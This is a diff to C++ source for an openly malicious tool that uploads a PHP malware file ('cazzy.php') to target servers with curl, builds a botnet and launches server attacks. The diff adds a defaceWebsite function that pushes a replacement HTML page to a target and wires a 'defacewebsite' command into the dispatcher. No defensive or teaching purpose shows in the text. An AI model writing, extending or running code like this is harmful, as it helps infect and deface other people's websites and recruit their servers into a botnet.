@@ -1,4 +1,3 @@
-
 #include <iostream>
 #include <string>
 #include <vector>
@@ -14,6 +13,7 @@
 #define MAX_THREADS 100
 #define TARGET_PORT 80
 #define MALWARE_FILE_NAME "cazzy.php"
+#define HTML_FILE_NAME "your_html_file.html"
 
 struct Bot {
     std::string ip;
@@ -29,6 +29,17 @@ void infectServer(const std::string& target) {
 
     std::string command = "echo '" + malwareCode + "' > " + MALWARE_FILE_NAME;
     command += " && curl -X POST -F 'file=@" + std::string(MALWARE_FILE_NAME) + "' " + target;
+
+    system(command.c_str());
+}
+
+void defaceWebsite(const std::string& target) {
+    std::ifstream htmlFile("cazzy.html");
+    std::string htmlContent((std::istreambuf_iterator<char>(htmlFile)),
+                             std::istreambuf_iterator<char>());
+
+    std::string command = "echo '" + htmlContent + "' > " + HTML_FILE_NAME;
+    command += " && curl -X POST -F 'file=@" + std::string(HTML_FILE_NAME) + "' " + target;
 
     system(command.c_str());
 }
@@ -88,11 +99,14 @@ void executeCommand(const std::string& command, const std::string& target) {
     else if (command == "deface") {
         infectServer(target);
     }
-    else if (command == "buildBotnet") {
+    else if (command == "buildbotnet") {
         buildBotnet();
     }
-    else if (command == "attackserver") {  // New command
+    else if (command == "attackserver") {
         attackServer(target);
+    }
+    else if (command == "defacewebsite") {
+        defaceWebsite(target);
     }
     else {
         for (const auto& bot : bots) {
